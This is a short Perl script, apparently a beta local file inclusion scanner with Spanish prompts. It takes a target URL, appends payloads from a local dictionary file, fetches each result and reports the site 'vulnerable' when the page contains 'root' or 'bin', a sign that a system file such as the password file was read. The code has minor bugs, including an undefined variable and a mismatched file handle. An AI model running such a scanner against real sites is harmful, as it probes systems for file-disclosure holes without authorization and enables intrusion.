#Cheking lfi Beta V0.1
use LWP::Simple;
print "\n";
print "Introduce tu URL \n";
$patra = <STDIN>;
chomp($patra);
print "\n\n";
$lfidicc = 'mhe/dicclfi.txt';

open ( EXPLOIT , "<$lfidicc");
while (@payload = <EXPLOIT>){
	chomp(@payload);



foreach $payasa(@payload){

	$newurl = $patra.$payasa;

	$pagina_codigo = LWP::Simple::get($newurl);
	print "$academ";

if ( $pagina_codigo =~ /root/ ||
	 $pagina_codigo =~ /bin/  ){
	print "[+] Vulnerable -> $newurl\n\n";

}
else {
	print "[-] No vulnerable -> $newurl\n\n";
}

}
close(LFI);
}


